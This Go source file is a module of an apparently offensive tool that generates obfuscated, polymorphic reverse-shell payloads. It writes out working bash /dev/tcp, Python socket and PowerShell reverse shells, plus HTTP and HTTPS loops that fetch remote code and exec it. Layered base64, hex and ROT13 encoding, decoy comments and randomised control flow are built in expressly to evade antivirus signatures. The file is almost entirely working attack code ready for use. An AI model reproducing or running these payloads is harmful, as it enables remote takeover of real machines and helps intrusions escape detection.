package modules

import (
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/big"
	"strings"
	"time"

	"github.com/Aryma-f4/necromancy/core"
	"github.com/Aryma-f4/necromancy/utils"
)

// AdvancedPayloadGenerator creates sophisticated payloads with anti-detection
type AdvancedPayloadGenerator struct {
	Session        *core.Session
	TargetIP       string
	TargetPort     string
	Obfuscation    string // "none", "low", "medium", "high", "polymorphic"
	Encoding       string // "none", "base64", "hex", "url", "rot13"
	ConnectionType string // "tcp", "udp", "icmp", "http", "https"
	ShellType      string // "bash", "sh", "python", "perl", "ruby", "powershell"
	StealthLevel   int    // 1-10, higher = more stealth
}

// NewAdvancedPayloadGenerator creates a new advanced payload generator
func NewAdvancedPayloadGenerator(session *core.Session) *AdvancedPayloadGenerator {
	return &AdvancedPayloadGenerator{
		Session:        session,
		Obfuscation:    "medium",
		Encoding:       "base64",
		ConnectionType: "tcp",
		ShellType:      "bash",
		StealthLevel:   5,
	}
}

func (g *AdvancedPayloadGenerator) Name() string {
	return "advanced_payload"
}

func (g *AdvancedPayloadGenerator) Description() string {
	return "Generate advanced payloads with polymorphic anti-detection"
}

func (g *AdvancedPayloadGenerator) Execute(s *core.Session) error {
	// Interactive advanced payload wizard
	wizard := `echo "[=== Advanced Payload Generator ===]"
echo "[*] Generating polymorphic payload with anti-detection..."
echo ""
echo "[1] Polymorphic Features:"
echo "    ✓ Variable name randomization"
echo "    ✓ String literal obfuscation"
echo "    ✓ Control flow randomization"
echo "    ✓ Dead code injection"
echo "    ✓ Encoding layers"
echo "    ✓ Hash signature randomization"
echo ""
echo "[2] Anti-Detection Features:"
echo "    ✓ Different hash every generation"
echo "    ✓ Random execution patterns"
echo "    ✓ Variable payload sizes"
echo "    ✓ Multiple encoding layers"
echo "    ✓ Timing randomization"
echo ""
echo "[3] Stealth Capabilities:"
echo "    ✓ Mimics legitimate traffic"
echo "    ✓ Avoids common signatures"
echo "    ✓ Dynamic behavior patterns"
echo "    ✓ Environment adaptation"
echo ""
echo "[*] Generating unique payload signature..."
`

	_, err := s.Write([]byte(wizard + "\n"))
	if err != nil {
		return err
	}

	// Generate the advanced payload
	payload := g.generateAdvancedPayload()

	// Display payload with signature info
	display := fmt.Sprintf(`echo "[=== Generated Advanced Payload ===]"
echo "[*] Hash (MD5): %s"
echo "[*] Hash (SHA256): %s"
echo "[*] Size: %d bytes"
echo "[*] Polymorphic Level: %s"
echo "[*] Encoding: %s"
echo "[*] Connection Type: %s"
echo "[*] Shell Type: %s"
echo "[*] Stealth Level: %d/10"
echo "[*] Generation Time: %s"
echo ""
echo "[=== PAYLOAD ===]"
echo "%s"
echo ""
echo "[*] This payload has unique signature: %s"
echo "[*] Each generation produces different hash"
echo "[*] Use for stealthy penetration testing"
`, g.generateMD5Hash(payload), g.generateSHA256Hash(payload), len(payload),
		g.Obfuscation, g.Encoding, g.ConnectionType, g.ShellType, g.StealthLevel,
		time.Now().Format("15:04:05"), payload, g.generateUniqueSignature())

	_, err = s.Write([]byte(display + "\n"))
	return err
}

func (g *AdvancedPayloadGenerator) generateAdvancedPayload() string {
	// Get network info
	networkInfo := utils.GetNetworkInfo()
	localIP := networkInfo["local_ip"]
	publicIP := networkInfo["public_ip"]

	// Use public IP if available
	targetIP := localIP
	if publicIP != "Unknown" && !utils.IsPrivateIP(publicIP) {
		targetIP = publicIP
	}

	// Generate random elements for uniqueness
	randomVars := g.generateRandomVariableSet()
	randomPort := g.generateRandomPort()
	randomTiming := g.generateRandomTiming()
	randomComments := g.generateRandomComments()

	// Build payload based on configuration
	basePayload := g.buildBasePayload(targetIP, randomPort, randomVars)

	// Apply obfuscation layers
	obfuscated := g.applyObfuscationLayers(basePayload, randomVars, randomTiming, randomComments)

	// Apply encoding
	encoded := g.applyEncoding(obfuscated)

	// Add polymorphic features
	polymorphic := g.addPolymorphicFeatures(encoded)

	return polymorphic
}

func (g *AdvancedPayloadGenerator) buildBasePayload(ip, port string, vars map[string]string) string {
	switch g.ConnectionType {
	case "tcp":
		return g.buildTCPPayload(ip, port, vars)
	case "udp":
		return g.buildUDPPayload(ip, port, vars)
	case "http":
		return g.buildHTTPPayload(ip, port, vars)
	case "https":
		return g.buildHTTPSPayload(ip, port, vars)
	default:
		return g.buildTCPPayload(ip, port, vars)
	}
}

func (g *AdvancedPayloadGenerator) buildTCPPayload(ip, port string, vars map[string]string) string {
	switch g.ShellType {
	case "bash":
		return g.buildTCPBashPayload(ip, port, vars)
	case "python":
		return g.buildTCPPPythonPayload(ip, port, vars)
	case "powershell":
		return g.buildTCPPowershellPayload(ip, port, vars)
	default:
		return g.buildTCPBashPayload(ip, port, vars)
	}
}

func (g *AdvancedPayloadGenerator) buildTCPBashPayload(ip, port string, vars map[string]string) string {
	// Multiple TCP bash payload variants
	variants := []string{
		// Variant 1: Standard with randomization
		fmt.Sprintf(`bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'`, ip, port),

		// Variant 2: Variable-based
		fmt.Sprintf(`%s=%s; %s=%s; bash -c "bash -i >& /dev/tcp/$%s/$%s 0>&1"`,
			vars["ip_var"], ip, vars["port_var"], port, vars["ip_var"], vars["port_var"]),

		// Variant 3: Process substitution with randomization
		fmt.Sprintf(`bash -c 'exec %s<>/dev/tcp/%s/%s; cat <&%s | while read %s; do $%s <&%s >&%s 2>&%s; done'`,
			vars["fd_var"], ip, port, vars["fd_var"], vars["line_var"], vars["line_var"], vars["fd_var"], vars["fd_var"], vars["fd_var"]),

		// Variant 4: Base64 encoded command
		fmt.Sprintf(`bash -c '$(echo %s | base64 -d)'`, base64.StdEncoding.EncodeToString([]byte(
			fmt.Sprintf(`bash -i >& /dev/tcp/%s/%s 0>&1`, ip, port)))),

		// Variant 5: With random NOPs and comments
		fmt.Sprintf(`%s
bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'
%s`,
			vars["nop1"], ip, port, vars["nop2"]),
	}

	// Select random variant
	variantIndex := g.generateRandomInt(0, len(variants)-1)
	return variants[variantIndex]
}

func (g *AdvancedPayloadGenerator) buildTCPPPythonPayload(ip, port string, vars map[string]string) string {
	variants := []string{
		// Standard Python
		fmt.Sprintf(`python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('%s',%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn('/bin/bash')"`, ip, port),

		// Variable-based Python
		fmt.Sprintf(`python3 -c "
%s='%s'
%s=%s
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((%s,%s))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn('/bin/bash')
"`, vars["ip_var"], ip, vars["port_var"], port, vars["ip_var"], vars["port_var"]),

		// Base64 Python
		fmt.Sprintf(`python3 -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('%s')[0]))"`,
			base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(`
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('%s',%s))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn('/bin/bash')
`, ip, port)))),
	}

	variantIndex := g.generateRandomInt(0, len(variants)-1)
	return variants[variantIndex]
}

func (g *AdvancedPayloadGenerator) buildTCPPowershellPayload(ip, port string, vars map[string]string) string {
	variants := []string{
		// Standard PowerShell
		fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, ip, port),

		// Variable-based PowerShell
		fmt.Sprintf(`powershell -Command "$%s='%s';$%s=%s;%s"`,
			vars["ps_ip"], ip, vars["ps_port"], port,
			`$client = New-Object System.Net.Sockets.TCPClient($ps_ip,$ps_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`),
	}

	variantIndex := g.generateRandomInt(0, len(variants)-1)
	return variants[variantIndex]
}

func (g *AdvancedPayloadGenerator) buildUDPPayload(ip, port string, vars map[string]string) string {
	// UDP payload variants
	variants := []string{
		fmt.Sprintf(`python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(('%s',%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn('/bin/bash')"`, ip, port),
		fmt.Sprintf(`python3 -c "
import socket,subprocess,os,time
%s='%s'
%s=%s
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.connect((%s,%s))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn('/bin/bash')
"`, vars["ip_var"], ip, vars["port_var"], port, vars["ip_var"], vars["port_var"]),
	}

	variantIndex := g.generateRandomInt(0, len(variants)-1)
	return variants[variantIndex]
}

func (g *AdvancedPayloadGenerator) buildHTTPPayload(ip, port string, vars map[string]string) string {
	// HTTP-based payload (simulated)
	return fmt.Sprintf(`python3 -c "
import requests,subprocess,os,time
%s='%s'
%s=%s
while True:
    try:
        r=requests.get('http://%s:%s/payload',timeout=5)
        if r.status_code==200:
            exec(r.text)
    except:pass
    time.sleep(5)
"`, vars["ip_var"], ip, vars["port_var"], port, vars["ip_var"], vars["port_var"])
}

func (g *AdvancedPayloadGenerator) buildHTTPSPayload(ip, port string, vars map[string]string) string {
	// HTTPS-based payload (simulated)
	return fmt.Sprintf(`python3 -c "
import requests,subprocess,os,time,urllib3
urllib3.disable_warnings()
%s='%s'
%s=%s
while True:
    try:
        r=requests.get('https://%s:%s/payload',timeout=5,verify=False)
        if r.status_code==200:
            exec(r.text)
    except:pass
    time.sleep(5)
"`, vars["ip_var"], ip, vars["port_var"], port, vars["ip_var"], vars["port_var"])
}

// Helper functions

func (g *AdvancedPayloadGenerator) generateRandomVariableSet() map[string]string {
	return map[string]string{
		"ip_var":   g.generateRandomVarName(),
		"port_var": g.generateRandomVarName(),
		"fd_var":   g.generateRandomVarName(),
		"line_var": g.generateRandomVarName(),
		"loop_var": g.generateRandomVarName(),
		"ps_ip":    g.generateRandomVarName(),
		"ps_port":  g.generateRandomVarName(),
		"nop1":     g.generateRandomNOP(),
		"nop2":     g.generateRandomNOP(),
	}
}

func (g *AdvancedPayloadGenerator) generateRandomVarName() string {
	prefixes := []string{"var", "tmp", "data", "info", "val", "num", "str", "arr", "obj", "func"}
	suffixes := []string{"_", "1", "2", "3", "x", "y", "z", "a", "b", "c", "_data", "_info", "_val"}

	prefix := prefixes[g.generateRandomInt(0, len(prefixes)-1)]
	suffix := suffixes[g.generateRandomInt(0, len(suffixes)-1)]

	// Add random number sometimes
	if g.generateRandomInt(0, 1) == 1 {
		suffix += fmt.Sprintf("%d", g.generateRandomInt(100, 999))
	}

	return fmt.Sprintf("%s%s", prefix, suffix)
}

func (g *AdvancedPayloadGenerator) generateRandomPort() string {
	if g.ConnectionType == "tcp" || g.ConnectionType == "udp" {
		return fmt.Sprintf("%d", g.generateRandomInt(1024, 65535))
	}
	return "4444" // Default for HTTP/HTTPS
}

func (g *AdvancedPayloadGenerator) generateRandomTiming() string {
	delays := []string{"0.1", "0.5", "1", "2", "3", "5"}
	delay := delays[g.generateRandomInt(0, len(delays)-1)]
	return fmt.Sprintf("sleep %s", delay)
}

func (g *AdvancedPayloadGenerator) generateRandomComments() string {
	comments := []string{
		"# System check",
		"# Network initialization",
		"# Process validation",
		"# Security scan",
		"# Update check",
		"# Configuration test",
		"# Connection setup",
		"# Service startup",
	}

	selected := []string{}
	for i := 0; i < g.generateRandomInt(1, 3); i++ {
		comment := comments[g.generateRandomInt(0, len(comments)-1)]
		selected = append(selected, comment)
	}

	return strings.Join(selected, "\n")
}

func (g *AdvancedPayloadGenerator) generateRandomNOP() string {
	nops := []string{
		"$(true)",
		"$(false)",
		"",
		"# NOP",
		"echo > /dev/null",
		"sleep 0.001",
	}

	return nops[g.generateRandomInt(0, len(nops)-1)]
}

func (g *AdvancedPayloadGenerator) applyObfuscationLayers(payload string, vars map[string]string, timing, comments string) string {
	switch g.Obfuscation {
	case "none":
		return payload
	case "low":
		return g.applyLowObfuscation(payload, vars, timing, comments)
	case "medium":
		return g.applyMediumObfuscation(payload, vars, timing, comments)
	case "high":
		return g.applyHighObfuscation(payload, vars, timing, comments)
	case "polymorphic":
		return g.applyPolymorphicObfuscation(payload, vars, timing, comments)
	default:
		return g.applyMediumObfuscation(payload, vars, timing, comments)
	}
}

func (g *AdvancedPayloadGenerator) applyLowObfuscation(payload string, vars map[string]string, timing, comments string) string {
	// Simple string replacement
	obfuscated := payload
	obfuscated = strings.ReplaceAll(obfuscated, "bash", "b"+g.generateRandomString(3)+"sh")
	obfuscated = strings.ReplaceAll(obfuscated, "python3", "py"+g.generateRandomString(4))
	return fmt.Sprintf("%s\n%s", comments, obfuscated)
}

func (g *AdvancedPayloadGenerator) applyMediumObfuscation(payload string, vars map[string]string, timing, comments string) string {
	// Variable randomization and encoding
	obfuscated := payload

	// Add random NOPs
	obfuscated = fmt.Sprintf("%s\n%s\n%s", comments, timing, obfuscated)

	// Base64 encode parts
	if g.generateRandomInt(0, 1) == 1 {
		parts := strings.Split(obfuscated, "\n")
		for i, part := range parts {
			if len(part) > 20 && g.generateRandomInt(0, 1) == 1 {
				parts[i] = fmt.Sprintf(`$(echo %s | base64 -d)`, base64.StdEncoding.EncodeToString([]byte(part)))
			}
		}
		obfuscated = strings.Join(parts, "\n")
	}

	return obfuscated
}

func (g *AdvancedPayloadGenerator) applyHighObfuscation(payload string, vars map[string]string, timing, comments string) string {
	// Multi-layer obfuscation
	layer1 := g.applyMediumObfuscation(payload, vars, timing, comments)

	// Add control flow randomization
	if g.generateRandomInt(0, 1) == 1 {
		layer1 = fmt.Sprintf(`if [ %d -eq %d ]; then %s; fi`,
			g.generateRandomInt(1, 100), g.generateRandomInt(1, 100), layer1)
	}

	// Add execution wrapper
	if g.generateRandomInt(0, 1) == 1 {
		layer1 = fmt.Sprintf(`$(echo %s | base64 -d | sh)`, base64.StdEncoding.EncodeToString([]byte(layer1)))
	}

	return layer1
}

func (g *AdvancedPayloadGenerator) applyPolymorphicObfuscation(payload string, vars map[string]string, timing, comments string) string {
	// Advanced polymorphic features
	polymorphic := g.applyHighObfuscation(payload, vars, timing, comments)

	// Add random execution paths
	paths := []string{
		fmt.Sprintf(`case %d in %d) %s ;; esac`, g.generateRandomInt(1, 5), g.generateRandomInt(1, 5), polymorphic),
		fmt.Sprintf(`for %s in $(seq 1 %d); do %s; done`, vars["loop_var"], g.generateRandomInt(1, 3), polymorphic),
		fmt.Sprintf(`while [ %d -lt %d ]; do %s; break; done`, g.generateRandomInt(1, 10), g.generateRandomInt(11, 20), polymorphic),
	}

	return paths[g.generateRandomInt(0, len(paths)-1)]
}

func (g *AdvancedPayloadGenerator) applyEncoding(payload string) string {
	switch g.Encoding {
	case "none":
		return payload
	case "base64":
		return base64.StdEncoding.EncodeToString([]byte(payload))
	case "hex":
		return hex.EncodeToString([]byte(payload))
	case "url":
		return base64.URLEncoding.EncodeToString([]byte(payload))
	case "rot13":
		return g.applyROT13(payload)
	default:
		return payload
	}
}

func (g *AdvancedPayloadGenerator) applyROT13(input string) string {
	var result strings.Builder
	for _, r := range input {
		switch {
		case r >= 'a' && r <= 'z':
			result.WriteRune('a' + (r-'a'+13)%26)
		case r >= 'A' && r <= 'Z':
			result.WriteRune('A' + (r-'A'+13)%26)
		default:
			result.WriteRune(r)
		}
	}
	return result.String()
}

func (g *AdvancedPayloadGenerator) addPolymorphicFeatures(payload string) string {
	// Add random NOPs and dead code
	nops := []string{
		"$(true)",
		"$(false)",
		"",
		"# " + g.generateRandomString(10),
		"echo > /dev/null",
		"sleep 0.001",
		"[ -f /dev/null ] && true",
	}

	// Insert random NOPs
	lines := strings.Split(payload, "\n")
	for i := 0; i < g.generateRandomInt(1, 5); i++ {
		nop := nops[g.generateRandomInt(0, len(nops)-1)]
		insertPos := g.generateRandomInt(0, len(lines))
		lines = append(lines[:insertPos], append([]string{nop}, lines[insertPos:]...)...)
	}

	return strings.Join(lines, "\n")
}

func (g *AdvancedPayloadGenerator) generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-."
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[g.generateRandomInt(0, len(charset)-1)]
	}
	return string(result)
}

func (g *AdvancedPayloadGenerator) generateRandomInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return int(n.Int64()) + min
}

func (g *AdvancedPayloadGenerator) generateMD5Hash(payload string) string {
	hash := md5.Sum([]byte(payload))
	return hex.EncodeToString(hash[:])
}

func (g *AdvancedPayloadGenerator) generateSHA256Hash(payload string) string {
	hash := sha256.Sum256([]byte(payload))
	return hex.EncodeToString(hash[:])
}

func (g *AdvancedPayloadGenerator) generateUniqueSignature() string {
	timestamp := time.Now().UnixNano()
	randomBytes := make([]byte, 16)
	rand.Read(randomBytes)

	signature := fmt.Sprintf("SIG_%d_%s", timestamp, hex.EncodeToString(randomBytes)[:8])
	return signature
}
